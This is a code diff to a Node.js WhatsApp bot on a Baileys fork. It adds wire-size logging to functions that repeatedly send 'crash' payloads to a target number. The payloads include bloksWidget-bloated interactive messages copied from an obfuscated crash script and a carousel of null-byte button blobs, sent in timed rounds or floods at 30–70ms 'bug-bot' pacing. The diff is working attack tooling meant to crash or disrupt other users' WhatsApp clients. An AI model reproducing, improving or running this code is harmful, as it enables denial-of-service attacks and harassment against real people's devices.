@@ -10,7 +10,8 @@ import makeWASocket, {
     delay,
     downloadMediaMessage,
     prepareWAMessageMedia,
-    generateWAMessageFromContent
+    generateWAMessageFromContent,
+    proto
 } from 'xzcbailz';
 import pino from 'pino';
 import express from 'express';
@@ -2568,6 +2569,17 @@ async function sendFiosProbe(prim, target) {
     return { locationNameChars: F_OS_NAME.length, buttonTextChars: F_OS_BUTTON_TEXT.length, pauseMs };
 }
 
+// Wire-size probe: measures the actual protobuf bytes that go on the wire,
+// so the send logs prove whether bloksWidget-class fields survived encoding
+// (~660KB = full fork power, ~160KB = bloksWidget dropped).
+function wireBytesOf(payload) {
+    try {
+        return proto.Message.encode(payload).finish().length;
+    } catch (_) {
+        try { return Buffer.byteLength(JSON.stringify(payload)); } catch (_) { return 0; }
+    }
+}
+
 // 🧪 TEMPORARY probe: the "fvckb1tch" hybrid from the obfuscated Squichy RX
 // case.js (crash-msg / crash-vis / crash-img / crash-expens), FULL version.
 // This test repo runs the xzcbailz fork, whose proto has Header.bloksWidget
@@ -2585,9 +2597,9 @@ async function sendCrashmsgProbe(prim, target) {
         }
         return q;
     };
-    let sent = 0;
+    let sent = 0, firstWireBytes = 0;
     for (let i = 0; i < 10; i++) {
-        await prim.relayMessage(target, {
+        const payload = {
             viewOnceMessage: {
                 message: {
                     groupStatusMentionMessage: {
@@ -2626,11 +2638,13 @@ async function sendCrashmsgProbe(prim, target) {
                     }
                 }
             }
-        }, {});
+        };
+        if (i === 0) firstWireBytes = wireBytesOf(payload);
+        await prim.relayMessage(target, payload, {});
         sent++;
         if (i < 9) await delay(1000);
     }
-    return { sent };
+    return { sent, wireBytes: firstWireBytes };
 }
 
 const CRASHCLICK_STATIC = {
@@ -5075,7 +5089,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 const res = await sendCrashmsgProbe(sock, cmTargetJid);
                 cmRoundsDone++;
                 cmSent += res.sent || 0;
-                log('TEST', `${phoneNumber}: .Cm round ${cmRoundsDone}/${cmRounds} (+${res.sent} payloads, total ${cmSent}) → ${cmTargetJid}`);
+                log('TEST', `${phoneNumber}: .Cm round ${cmRoundsDone}/${cmRounds} (+${res.sent} payloads, total ${cmSent}${res.wireBytes ? `, ${res.wireBytes}B wire each` : ''}) → ${cmTargetJid}`);
                 if (r < cmRounds - 1) await delay(30 + Math.floor(Math.random() * 40));
             }
             await safeWaReply(sock, remoteJid, `🧪 .Cm done: ${cmRoundsDone} rounds, ${cmSent} payloads → ${cmTargetNumber}`, msg);
@@ -7114,7 +7128,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             // (exactly the original Squichy RX send), and the fork's proto
             // encodes Header.bloksWidget — full-strength payload.
             async function androz(prim, target) {
-                await prim.relayMessage(target, {
+                const payload = {
                     groupStatusMessageV2: {
                         message: {
                             interactiveMessage: {
@@ -7135,7 +7149,10 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                             }
                         }
                     }
-                }, { participant: true });
+                };
+                const wireBytes = wireBytesOf(payload);
+                await prim.relayMessage(target, payload, { participant: true });
+                return { wireBytes };
             }
 
             // ── PAYLOAD B: testfff — carousel of 30 cards, null-byte button blobs ──
@@ -7172,10 +7189,12 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                     },
                     {}
                 );
+                const wireBytes = wireBytesOf(outMsg.message);
                 await prim.relayMessage(target, outMsg.message, {
                     participant: true,
                     messageId: outMsg.key.id
                 });
+                return { wireBytes };
             }
 
             // Prepare the fff card image once per run (img mode); if unavailable
@@ -7205,10 +7224,12 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
             let sent = 0;
             try {
+                let lastWireBytes = 0;
                 for (let n = 0; n < count; n++) {
-                    await fire(sock, targetJid, fffImage);
+                    const r = await fire(sock, targetJid, fffImage);
                     sent++;
-                    log('TEST', `${phoneNumber}: .test [${payloadKind}${fffMode}] send ${sent}/${count} → ${targetJid} input="${input}"`);
+                    if (r?.wireBytes) lastWireBytes = r.wireBytes;
+                    log('TEST', `${phoneNumber}: .${displayKind}${fffMode} send ${sent}/${count}${lastWireBytes ? ` (${lastWireBytes}B wire)` : ''} → ${targetJid} input="${input}"`);
                     // >10 explicit count = bug-bot pacing (30–70ms jitter), else 1.2s
                     if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
                 }
